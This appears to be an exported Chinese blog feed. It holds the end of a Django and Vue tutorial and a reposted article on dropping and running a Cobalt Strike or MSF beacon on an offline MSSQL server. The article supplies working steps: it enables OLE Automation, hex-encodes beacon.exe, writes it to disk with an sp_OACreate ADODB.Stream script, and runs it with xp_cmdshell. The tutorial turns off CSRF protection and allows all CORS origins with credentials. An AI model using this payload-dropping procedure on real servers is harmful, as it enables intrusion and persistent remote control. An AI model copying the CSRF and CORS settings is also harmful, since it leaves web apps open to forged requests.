+<h3 id="5-生成数据库迁移文件"><a href="#5-生成数据库迁移文件" class="headerlink" title="5.生成数据库迁移文件"></a>5.生成数据库迁移文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py migrate</span><br><span class="line">python manage.py makemigrations</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-创建视图处理函数"><a href="#6-创建视图处理函数" class="headerlink" title="6.创建视图处理函数"></a>6.创建视图处理函数</h3><p>作为接口 给前端调用</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> unicode_literals</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> django.core <span class="keyword">import</span> serializers</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> JsonResponse</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="keyword">from</span> django.views.decorators.http <span class="keyword">import</span> require_http_methods</span><br><span class="line"><span class="keyword">from</span> myApp.models <span class="keyword">import</span> Student</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建view</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#add_student 接受一个get请求 网数据里添加一条student 数据</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">@require_http_methods(<span class="params">[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_student</span>(<span class="params">request</span>):</span><br><span class="line">    response = &#123;&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"> </span><br><span class="line">        student = Student(student_name=request.GET.get(<span class="string">&#x27;student_name&#x27;</span>))</span><br><span class="line"> </span><br><span class="line">        student.save()</span><br><span class="line"> </span><br><span class="line">        response[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;success&quot;</span></span><br><span class="line"> </span><br><span class="line">        response[<span class="string">&#x27;error_num&#x27;</span>]=<span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"> </span><br><span class="line">            response[<span class="string">&#x27;msg&#x27;</span>] = <span class="built_in">str</span>(e)</span><br><span class="line"> </span><br><span class="line">            response[<span class="string">&#x27;error_num&#x27;</span>] = <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> JsonResponse(response)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># show_students返回所有的学生列表（通过JsonResponse返回能被前端识别的json格式数据）</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">@require_http_methods(<span class="params">[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_students</span>(<span class="params">request</span>):</span><br><span class="line">    response = &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        students = Student.objects.<span class="built_in">filter</span>()</span><br><span class="line">        response[<span class="string">&#x27;list&#x27;</span>] = json.loads(serializers.serialize(<span class="string">&quot;json&quot;</span>, students))</span><br><span class="line">        response[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;success&#x27;</span></span><br><span class="line">        response[<span class="string">&#x27;error_num&#x27;</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        response[<span class="string">&#x27;msg&#x27;</span>] = <span class="built_in">str</span>(e)</span><br><span class="line">        response[<span class="string">&#x27;error_num&#x27;</span>] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> JsonResponse(response)</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-配置路由"><a href="#7-配置路由" class="headerlink" title="7.配置路由"></a>7.配置路由</h3><p>InfoScan app 下面新增 urls.py 文件</p>
+<p>创建分支路由，把新增的两个视图函数放进来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.conf.urls import url</span><br><span class="line">from . import views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(&#x27;add_student/&#x27;,views.add_student),</span><br><span class="line">    url(&#x27;show_students/&#x27;,views.show_students),</span><br><span class="line"></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<p>将分支路由加到项目文件夹下的主路由中urls.py</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.contrib import admin</span><br><span class="line">from django.urls import path</span><br><span class="line">from django.views.generic import TemplateView</span><br><span class="line">from django.conf.urls import include</span><br><span class="line">from InfoScan import urls</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(&#x27;admin/&#x27;, admin.site.urls),</span><br><span class="line">    path(&#x27;api/&#x27;, include(urls)),</span><br><span class="line">    path(&#x27;&#x27;, TemplateView.as_view(template_name=&#x27;index.html&#x27;)),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="🔧二、Vue"><a href="#🔧二、Vue" class="headerlink" title="🔧二、Vue"></a>🔧二、Vue</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/PentestWeb%E5%BC%80%E5%8F%91(%E4%B8%80)/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVmluY2VudHN4aA==,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="img"></p>
+<h3 id="1-安装脚手架"><a href="#1-安装脚手架" class="headerlink" title="1.安装脚手架"></a>1.安装脚手架</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g vue-cli</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-新建前端工程项目"><a href="#2-新建前端工程项目" class="headerlink" title="2.新建前端工程项目"></a>2.新建前端工程项目</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vue-init webpack ptvue</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.jianshu.com/p/9f1bb706311a">https://www.jianshu.com/p/9f1bb706311a</a></p>
+<h3 id="3-安装依赖包"><a href="#3-安装依赖包" class="headerlink" title="3.安装依赖包"></a>3.安装依赖包</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ptvue</span><br><span class="line">npm install</span><br><span class="line"># 尝试一下是否可以运行</span><br><span class="line">npm dev	</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-安装ElementUI"><a href="#4-安装ElementUI" class="headerlink" title="4.安装ElementUI"></a>4.安装ElementUI</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ptvue</span><br><span class="line">npm i element-ui -S</span><br><span class="line"># 如果提示缺失依赖，安装就好了</span><br><span class="line">npm install -g core-js@3.1.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--save 安装依赖到 mode_modules 目录下,写入dependencies节点, npm install 时下载该依赖,一般安装生成环境所用依赖, 如 vue, element-ui, echarts…</span><br><span class="line">-g 全局安装,不在 mode_modules 目录下,不写入节点, npm install 时不下载该依赖.</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-创建vue页面"><a href="#5-创建vue页面" class="headerlink" title="5.创建vue页面"></a>5.创建vue页面</h3><p>在src&#x2F;component下，新建组件Student.vue</p>
+<p>调用之前在Django项目里的api实现相应的功能</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line"> </span><br><span class="line">  &lt;div class=&quot;home&quot;&gt;</span><br><span class="line"> </span><br><span class="line">    &lt;el-row display=&quot;margin-top:10px&quot;&gt;</span><br><span class="line"> </span><br><span class="line">        &lt;el-input v-model=&quot;input&quot; placeholder=&quot;请输入学生姓名&quot; style=&quot;display:inline-table; width: 30%; float:left&quot;&gt;&lt;/el-input&gt;</span><br><span class="line"> </span><br><span class="line">        &lt;el-button type=&quot;primary&quot; @click=&quot;addStudent()&quot; style=&quot;float:left; margin: 2px;&quot;&gt;新增&lt;/el-button&gt;</span><br><span class="line"> </span><br><span class="line">    &lt;/el-row&gt;</span><br><span class="line"> </span><br><span class="line">    &lt;el-row&gt;</span><br><span class="line"> </span><br><span class="line">        &lt;el-table :data=&quot;studentList&quot; style=&quot;width: 100%&quot; border&gt;</span><br><span class="line"> </span><br><span class="line">          &lt;el-table-column prop=&quot;id&quot; label=&quot;编号&quot; min-width=&quot;100&quot;&gt;</span><br><span class="line"> </span><br><span class="line">            &lt;template slot-scope=&quot;scope&quot;&gt; &#123;&#123; scope.row.pk &#125;&#125; &lt;/template&gt;</span><br><span class="line"> </span><br><span class="line">          &lt;/el-table-column&gt;</span><br><span class="line"> </span><br><span class="line">          &lt;el-table-column prop=&quot;student_name&quot; label=&quot;姓名&quot; min-width=&quot;100&quot;&gt;</span><br><span class="line"> </span><br><span class="line">            &lt;template slot-scope=&quot;scope&quot;&gt; &#123;&#123; scope.row.fields.student_name &#125;&#125; &lt;/template&gt;</span><br><span class="line"> </span><br><span class="line">          &lt;/el-table-column&gt;</span><br><span class="line"> </span><br><span class="line">          &lt;el-table-column prop=&quot;student_sex&quot; label=&quot;性别&quot; min-width=&quot;100&quot;&gt;</span><br><span class="line"> </span><br><span class="line">            &lt;template slot-scope=&quot;scope&quot;&gt; &#123;&#123; scope.row.fields.student_sex &#125;&#125; &lt;/template&gt;</span><br><span class="line"> </span><br><span class="line">          &lt;/el-table-column&gt;</span><br><span class="line"> </span><br><span class="line">          &lt;el-table-column prop=&quot;add_time&quot; label=&quot;添加时间&quot; min-width=&quot;100&quot;&gt;</span><br><span class="line"> </span><br><span class="line">            &lt;template slot-scope=&quot;scope&quot;&gt; &#123;&#123; scope.row.fields.create_time &#125;&#125; &lt;/template&gt;</span><br><span class="line"> </span><br><span class="line">          &lt;/el-table-column&gt;</span><br><span class="line"> </span><br><span class="line">        &lt;/el-table&gt;</span><br><span class="line"> </span><br><span class="line">    &lt;/el-row&gt;</span><br><span class="line"> </span><br><span class="line">  &lt;/div&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/template&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;script&gt;</span><br><span class="line"> </span><br><span class="line">export default &#123;</span><br><span class="line"> </span><br><span class="line">  name: &#x27;Student&#x27;,</span><br><span class="line"> </span><br><span class="line">  data () &#123;</span><br><span class="line"> </span><br><span class="line">    return &#123;</span><br><span class="line"> </span><br><span class="line">      input: &#x27;&#x27;,</span><br><span class="line"> </span><br><span class="line">      studentList: []</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  &#125;,</span><br><span class="line"> </span><br><span class="line">  mounted: function () &#123;</span><br><span class="line"> </span><br><span class="line">    this.showStudents()</span><br><span class="line"> </span><br><span class="line">  &#125;,</span><br><span class="line"> </span><br><span class="line">  methods: &#123;</span><br><span class="line"> </span><br><span class="line">    addStudent () &#123;</span><br><span class="line"> </span><br><span class="line">      this.$http.get(&#x27;http://127.0.0.1:8000/api/add_student?student_name=&#x27; + this.input)</span><br><span class="line"> </span><br><span class="line">        .then((response) =&gt; &#123;</span><br><span class="line"> </span><br><span class="line">          var res = JSON.parse(response.bodyText)</span><br><span class="line"> </span><br><span class="line">          if (res.error_num === 0) &#123;</span><br><span class="line"> </span><br><span class="line">            this.showStudents()</span><br><span class="line"> </span><br><span class="line">          &#125; else &#123;</span><br><span class="line"> </span><br><span class="line">            this.$message.error(&#x27;新增学生失败，请重试&#x27;)</span><br><span class="line"> </span><br><span class="line">            console.log(res[&#x27;msg&#x27;])</span><br><span class="line"> </span><br><span class="line">          &#125;</span><br><span class="line"> </span><br><span class="line">        &#125;)</span><br><span class="line"> </span><br><span class="line">    &#125;,</span><br><span class="line"> </span><br><span class="line">    showStudents () &#123;</span><br><span class="line"> </span><br><span class="line">      this.$http.get(&#x27;http://127.0.0.1:8000/api/show_students&#x27;)</span><br><span class="line"> </span><br><span class="line">        .then((response) =&gt; &#123;</span><br><span class="line"> </span><br><span class="line">          var res = JSON.parse(response.bodyText)</span><br><span class="line"> </span><br><span class="line">          console.log(res)</span><br><span class="line"> </span><br><span class="line">          if (res.error_num === 0) &#123;</span><br><span class="line"> </span><br><span class="line">            this.studentList = res[&#x27;list&#x27;]</span><br><span class="line"> </span><br><span class="line">            console.log(this.studentList)</span><br><span class="line"> </span><br><span class="line">          &#125; else &#123;</span><br><span class="line"> </span><br><span class="line">            this.$message.error(&#x27;查询学生失败&#x27;)</span><br><span class="line"> </span><br><span class="line">            console.log(res[&#x27;msg&#x27;])</span><br><span class="line"> </span><br><span class="line">          &#125;</span><br><span class="line"> </span><br><span class="line">        &#125;)</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;/script&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;!-- Add &quot;scoped&quot; attribute to limit CSS to this component only --&gt;</span><br><span class="line"> </span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"> </span><br><span class="line">h1, h2 &#123;</span><br><span class="line"> </span><br><span class="line">  font-weight: normal;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">ul &#123;</span><br><span class="line"> </span><br><span class="line">  list-style-type: none;</span><br><span class="line"> </span><br><span class="line">  padding: 0;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">li &#123;</span><br><span class="line"> </span><br><span class="line">  display: inline-block;</span><br><span class="line"> </span><br><span class="line">  margin: 0 10px;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">a &#123;</span><br><span class="line"> </span><br><span class="line">  color: #42b983;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-配置路由"><a href="#6-配置路由" class="headerlink" title="6.配置路由"></a>6.配置路由</h3><p>ptvue&#x2F;router文件夹下的index.js中增加页面路由:</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">HelloWorld</span> <span class="keyword">from</span> <span class="string">&#x27;@/components/HelloWorld&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Student</span> <span class="keyword">from</span> <span class="string">&#x27;@/components/Student&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Router</span> <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Router</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Router</span>(&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="attr">routes</span>: [&#123;</span><br><span class="line"> </span><br><span class="line">                <span class="attr">path</span>: <span class="string">&#x27;/HelloWorld&#x27;</span>,</span><br><span class="line"> </span><br><span class="line">                <span class="attr">name</span>: <span class="string">&#x27;HelloWorld&#x27;</span>,</span><br><span class="line"> </span><br><span class="line">                <span class="attr">component</span>: <span class="title class_">HelloWorld</span></span><br><span class="line"> </span><br><span class="line">            &#125;,</span><br><span class="line"> </span><br><span class="line">            &#123;</span><br><span class="line"> </span><br><span class="line">                <span class="attr">path</span>: <span class="string">&#x27;/student&#x27;</span>,</span><br><span class="line"> </span><br><span class="line">                <span class="attr">name</span>: <span class="string">&#x27;Student&#x27;</span>,</span><br><span class="line"> </span><br><span class="line">                <span class="attr">component</span>: <span class="title class_">Student</span></span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        ]</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// eslint-disable-next-line eol-last</span></span><br><span class="line"> </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>ptvue文件夹下的main.js中引入ElementUI并注册:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// The Vue build version to load with the `import` command</span><br><span class="line"> </span><br><span class="line">// (runtime-only or standalone) has been set in webpack.base.conf with an alias.</span><br><span class="line"> </span><br><span class="line">import &#x27;default-passive-events&#x27;</span><br><span class="line"> </span><br><span class="line">import ElementUI from &#x27;element-ui&#x27;</span><br><span class="line"> </span><br><span class="line">import Vue from &#x27;vue&#x27;</span><br><span class="line"> </span><br><span class="line">// 引入vue-resource</span><br><span class="line"> </span><br><span class="line">import VueResource from &#x27;vue-resource&#x27;</span><br><span class="line"> </span><br><span class="line">// 注册ElementUI组件</span><br><span class="line"> </span><br><span class="line">import &#x27;../node_modules/element-ui/lib/theme-chalk/index.css&#x27;</span><br><span class="line"> </span><br><span class="line">import App from &#x27;./App&#x27;</span><br><span class="line"> </span><br><span class="line">import router from &#x27;./router&#x27;</span><br><span class="line"> </span><br><span class="line">Vue.config.productionTip = false</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">// 注册ElementUI组件</span><br><span class="line"> </span><br><span class="line">Vue.use(ElementUI)</span><br><span class="line"> </span><br><span class="line">// 注册VueResource</span><br><span class="line"> </span><br><span class="line">Vue.use(VueResource)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* eslint-disable no-new */</span><br><span class="line"> </span><br><span class="line">new Vue(&#123;</span><br><span class="line"> </span><br><span class="line">    el: &#x27;#app&#x27;,</span><br><span class="line"> </span><br><span class="line">    router,</span><br><span class="line"> </span><br><span class="line">    components: &#123; App &#125;,</span><br><span class="line"> </span><br><span class="line">    template: &#x27;&lt;App/&gt;&#x27;</span><br><span class="line"> </span><br><span class="line">        // eslint-disable-next-line eol-last</span><br><span class="line"> </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="🔗三、整合"><a href="#🔗三、整合" class="headerlink" title="🔗三、整合"></a>🔗三、整合</h2><h3 id="1-前端vue项目调用后端引入vue-resource"><a href="#1-前端vue项目调用后端引入vue-resource" class="headerlink" title="1.前端vue项目调用后端引入vue-resource"></a>1.前端vue项目调用后端引入vue-resource</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install vue-resource --save</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-解决跨域问题"><a href="#2-解决跨域问题" class="headerlink" title="2.解决跨域问题"></a>2.解决跨域问题</h3><p>在Django层注入header，安装django-cors-headers：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m pip install django-cors-headers</span><br></pre></td></tr></table></figure>
+
+<p>修改 settings.py:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    &#x27;InfoScan&#x27;,</span><br><span class="line">    &#x27;corsheaders&#x27;,              # 解决跨域</span><br><span class="line">    &#x27;django.contrib.admin&#x27;,</span><br><span class="line">    ...</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<p>在MIDDLEWARE_CLASSES添加 ‘corsheaders.middleware.CorsMiddleware’， 同时把csrf的中间件注释掉</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MIDDLEWARE = [</span><br><span class="line">    &#x27;django.middleware.security.SecurityMiddleware&#x27;,</span><br><span class="line">    &#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.common.CommonMiddleware&#x27;,</span><br><span class="line">    # &#x27;django.middleware.csrf.CsrfViewMiddleware&#x27;,</span><br><span class="line">    &#x27;corsheaders.middleware.CorsMiddleware&#x27;,                    # 解决跨域</span><br><span class="line">    &#x27;django.contrib.auth.middleware.AuthenticationMiddleware&#x27;,</span><br><span class="line">    &#x27;django.contrib.messages.middleware.MessageMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.clickjacking.XFrameOptionsMiddleware&#x27;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<p>继续添加如下代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CORS_ALLOW_CREDENTIALS = True</span><br><span class="line">CORS_ORIGIN_ALLOW_ALL = True</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-增加Django路由"><a href="#3-增加Django路由" class="headerlink" title="3.增加Django路由"></a>3.增加Django路由</h3><p>修改settings.py,指向vue项目下的静态资源 dist：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TEMPLATES = [</span><br><span class="line">    &#123;</span><br><span class="line">        &#x27;BACKEND&#x27;: &#x27;django.template.backends.django.DjangoTemplates&#x27;,</span><br><span class="line">        &#x27;DIRS&#x27;: [&#x27;Ptvue/dist&#x27;],</span><br><span class="line">        &#x27;APP_DIRS&#x27;: True,</span><br><span class="line">        &#x27;OPTIONS&#x27;: &#123;</span><br><span class="line">            &#x27;context_processors&#x27;: [</span><br><span class="line">                ...</span><br><span class="line">            ],</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<p>继续添加静态文件路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">STATICFILES_DIRS = [</span><br><span class="line">    os.path.join(BASE_DIR, &#x27;Ptvue/dist/static&#x27;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-重新打包和运行项目"><a href="#4-重新打包和运行项目" class="headerlink" title="4.重新打包和运行项目"></a>4.重新打包和运行项目</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm run build</span><br><span class="line">python manage.py runserver</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/PentestWeb%E5%BC%80%E5%8F%91(%E4%B8%80)/image-20220613215233337.png" alt="image-20220613215233337"></p>
+<h2 id="💡四、参考链接"><a href="#💡四、参考链接" class="headerlink" title="💡四、参考链接"></a>💡四、参考链接</h2><p><a href="https://www.jb51.net/article/167473.htm">https://www.jb51.net/article/167473.htm</a></p>
+<p><a href="https://blog.csdn.net/weixin_42557538/article/details/121017085">https://blog.csdn.net/weixin_42557538/article/details/121017085</a></p>
+<p><a href="https://blog.csdn.net/qq_40722582/article/details/113826647">https://blog.csdn.net/qq_40722582/article/details/113826647</a></p>
+]]></content>
+      <categories>
+        <category>编程随想</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MSSQL不出网文件落地上线方式</title>
+    <url>/posts/a83843a4.html</url>
+    <content><![CDATA[<blockquote>
+<p>编者荐语：原理是通过MSSQL写入PE，通过出网主机代理上线，需要结合不出网上线主机方案，推荐使用 goproxy 代理上线。</p>
+<p>转载自：<a href="https://mp.weixin.qq.com/s/aZSNpn-hLwI2MzyS0XKa8w">https://mp.weixin.qq.com/s/aZSNpn-hLwI2MzyS0XKa8w</a></p>
+</blockquote>
+<p><strong>0x01 前言</strong></p>
+<p>一个MSSQL非注入的场景：在内网扫描到一个MSSQL弱口令，支持xp_cmdshell，Administrator权限，但不能出网，DNS也出不了，那么我们该如何将文件落地到目标主机并执行上线呢？</p>
+<p><strong>0x02 利用思路</strong></p>
+<p>我们可以通过当前这台能出网的主机开启一个Socks代理连接不出网主机的MSSQL，然后再利用以下方式将PE文件落地到不出网的MSSQL主机，最终通过出网主机来中转上线不出网主机。</p>
+<p><strong>0x03 启用OLE组件</strong></p>
+<p>在执行命令或写入文件时都需要用到sp_oacreate，这主要是用来创建OLE对象，所以需要先执行以下SQL语句来启用“OLE Automation Procedures”组件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec master.dbo.sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">RECONFIGURE</span><br><span class="line">exec master.dbo.sp_configure &#x27;Ole Automation Procedures&#x27;, 1</span><br><span class="line">RECONFIGURE</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640.png" alt="图片"></p>
+<p><strong>0x04 EXE转换HEX</strong></p>
+<p>使用以下方式将生成的CS&#x2F;MSF攻击载荷文件转换为HEX编码，这里我找了几个可以转换HEX编码的方法，Linux的xxd命令，python脚本，或者010editor编辑器，根据个人习惯选择吧。</p>
+<p><strong>(1) Linux exe -&gt; hex</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxd -ps beacon.exe hex.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640-165456952771817.png" alt="图片"></p>
+<p><strong>(2) python exe -&gt; hex</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import binascii</span><br><span class="line">filename = &#x27;beacon.exe&#x27;</span><br><span class="line">with open(filename, &#x27;rb&#x27;) as f:</span><br><span class="line">    content = f.read()</span><br><span class="line">print(binascii.hexlify(content))</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640-165456952771918.png" alt="图片"></p>
+<p><strong>(3) 010editor exe -&gt; hex</strong></p>
+<p>利用这种方式拷贝下来的HEX也能使用certutil.exe -decodehex正常解码，但如果要用OLE组件写入时就还需要做下处理，将空格、换行都删掉，全部放在一行即可。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640-165456952771919.png" alt="图片"></p>
+<p><strong>0x05 EXE文件落地</strong></p>
+<p>将我们上边转换好的HEX编码放在第一行，加上0x，然后在本地的Navicat Premium数据库管理工具中执行即可，这时可以看到cs.exe文件已经成功落地到目标主机的磁盘。</p>
+<p><strong>注：</strong>xp_cmdshell组件调用的是cmd.exe，所以在利用这种方式写入大文件时可能会出现字符长度限制等问题。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECLARE @DATA VARBINARY(MAX) = 0x-hex</span><br><span class="line">        DECLARE @filepath VARCHAR(MAX) = &#x27;C:\\Windows\\temp\\cs.exe&#x27;</span><br><span class="line">        DECLARE @ObjectToken INT</span><br><span class="line">        EXEC sp_OACreate &#x27;ADODB.Stream&#x27;, @ObjectToken OUTPUT</span><br><span class="line">        EXEC sp_OASetProperty @ObjectToken, &#x27;Type&#x27;, 1</span><br><span class="line">        EXEC sp_OAMethod @ObjectToken, &#x27;Open&#x27;</span><br><span class="line">        EXEC sp_OAMethod @ObjectToken, &#x27;Write&#x27;, NULL, @DATA</span><br><span class="line">        EXEC sp_OAMethod @ObjectToken, &#x27;SaveToFile&#x27;, NULL, @filepath, 2</span><br><span class="line">        EXEC sp_OAMethod @ObjectToken, &#x27;Close&#x27;</span><br><span class="line">        EXEC sp_OADestroy @ObjectToken</span><br><span class="line">        SELECT @filepath</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640-165456952772020.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640-165456952772021.png" alt="图片"></p>
+<p><strong>0x06 执行EXE上线</strong></p>
+<p>这时再利用xp_cmdshell、sp_oacreate等方式去执行刚落地的cs.exe即可上线。这里我只是根据这种场景进行了简单的模拟测试，不出网主机上线方式可参考我之前分享的。</p>
